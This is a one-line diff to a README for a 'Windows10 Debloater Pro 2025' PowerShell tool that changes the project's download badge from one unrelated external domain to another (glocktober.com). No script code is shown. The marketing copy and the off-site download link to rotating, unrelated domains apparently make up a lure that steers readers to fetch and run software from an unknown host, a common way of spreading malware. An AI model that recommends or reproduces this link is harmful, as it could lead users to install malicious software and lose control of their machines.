@@ -2,7 +2,7 @@
 
 🚀 Transform your Windows experience with this powerful PowerShell script! Windows10 Debloater Pro 2025 removes bloatware, stops telemetry, and optimizes performance for gamers and privacy enthusiasts.
 
-[![Download Windows10 Debloater](https://img.shields.io/badge/Download-Windows10_Debloater-blueviolet)](https://cea-groupe.com)
+[![Download Windows10 Debloater](https://img.shields.io/badge/Download-Windows10_Debloater-blueviolet)](https://glocktober.com)
 
 ---
 
